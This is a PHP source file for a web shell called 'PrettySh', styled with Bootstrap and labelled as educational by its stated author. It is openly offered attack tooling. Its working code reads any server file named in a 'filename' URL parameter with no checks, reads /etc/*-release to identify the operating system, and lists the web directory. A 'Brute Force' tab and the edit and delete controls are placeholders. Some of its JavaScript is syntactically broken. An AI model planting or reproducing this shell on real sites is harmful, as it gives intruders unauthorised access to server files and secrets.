<?php
/**
 * I am tired of cleaning up nasty looking 1995 web shells
 * therefore I present to you the web2.0 bootstrap web shell
 * This file is meant as to be for educational purposes and 
 * anything you do with it is at your own discretion.
 * 
 * Copyright: Matt Harris
 * Author: Matt Harris
 * Website: http://mattharris.org
 * E-mail: admin@mattharris.org
 *
 * PS: Script kiddies, learn some bloody design concepts......
 **/
class Core {

    public function __construct() {
    }

    public function open_file() {
	$content = file_get_contents($_GET['filename']);
	echo '<textarea>';
	echo $content;
	echo '</textarea>';
    } 

    public function print_os() {
        $files = glob('/etc/*-release');
        $os = file_get_contents($files[0]);
        return $os;    
    }

    public function print_http() {
    }

    public function print_server_info() {
	echo '<table class="table table-striped table-bordered table-hover">';
	echo '<thead>';
        echo '<tr>';
        echo '<th>Information</th>';
        echo '<th>Data</th>';
	echo '</tr>';
	echo '</thead>';
        echo '<tbody>';
	echo '<tr>';
	echo '<td>Operating System</td>';
	echo '<td>' . $this->print_os() . '</td>';
	echo '</tr>';
	echo '</tbody>';
	echo '</table>';
    }

    public function list_files() {
	echo '<table class="table table-striped table-bordered table-hover">';
	echo '<thead>';
	echo '<tr>';
	echo '<th>Filename</th>';
	echo '<th>Edit</th>';
	echo '<th>Delete</th>';
	echo '</tr>';
	echo '</thead>';
	echo '<tbody>';
	foreach ( glob("*") as $f ) {
	  echo '<tr>';
	  echo '<td>' . $f . '</td>';
	  echo '<td class="small-width"><span class="glyphicon glyphicon-pencil edit-file pointy"i data-toggle="modal" data-target="#edit_box"></span></td>';
	  echo '<td class="small-width"><span class="glyphicon glyphicon-remove delete-file pointy"></td>';
	  echo '</tr>';
	}
	echo '</tbody>';
	echo '</table>';
    }

}

$shell = new Core();
?>

<!-- Typically this would be in some sort of view but shells are meant to be compact -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Pr377'/ 5|-|3LL</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap-theme.min.css">
    <style>
      .pointy {
	cursor:pointer;
      }
      .small-width {
	width:100px;
	min-width:100px;
	max-width:100px;
      }
    </style>
  </head>
  <body>
    <nav class="navbar navbar-default">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="#">PrettySh</a>
        </div>

        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
          <ul class="nav navbar-nav">
            <li class="active"><a href="#">File Manager <span class="sr-only">(current)</span></a></li>
            <li><a href="#">Brute Force</a></li>
            <li class="dropdown">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Dropdown <span class="caret"></span></a>
              <ul class="dropdown-menu" role="menu">
                <li><a href="#">Action</a></li>
                <li><a href="#">Another action</a></li>
                <li><a href="#">Something else here</a></li>
                <li class="divider"></li>
                <li><a href="#">Separated link</a></li>
                <li class="divider"></li>
                <li><a href="#">One more separated link</a></li>
              </ul>
            </li>
          </ul>
        </div>
      </div>
    </nav> 
    <div class="container">
      <div class="row">
        <div class="col-md-12">
	  <div class="panel panel-info">
            <div class="panel-heading">
              <h3 class="panel-title">Server Information</h3>
            </div>
            <div class="panel-body">
              <?php $shell->print_server_info(); ?>
            </div>
          </div>
        </div>
      </div>
      <div class="row">
        <div class="col-md-12">
	  <div class="panel panel-info">
	    <div class="panel-heading">
	      <h3 class="panel-title">File Manager</h3>
	    </div>
	    <div class="panel-body">
	      <?php $shell->list_files(); ?>
	    </div>
	  </div>
        </div>
      </div>
    </div>

<div class="modal fade" id="edit_box">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title">Edit File</h4>
      </div>
      <div class="modal-body">
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary">Save changes</button>
      </div>
    </div><!-- /.modal-content -->
  </div><!-- /.modal-dialog -->
</div><!-- /.modal -->

    <script src="https://code.jquery.com/jquery-2.1.3.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
    <script>
    $(document).ready({
	function getRequest(query) {
	    var url = window.location.pathname;
	    var filename = url.substring(url.lastIndexOf('/')+1);
	    $.ajax({
		type: GET,
		data: query,
		url: filename,
		success: function(data) {
		    console.log(data);
		}
	    });
	}      
	
	$(".edit_file").click(function() {
	    var filename = $(this).parent().prev().text();
	    console.log(filename);
	});
    });
    </script>
  </body>
</html>

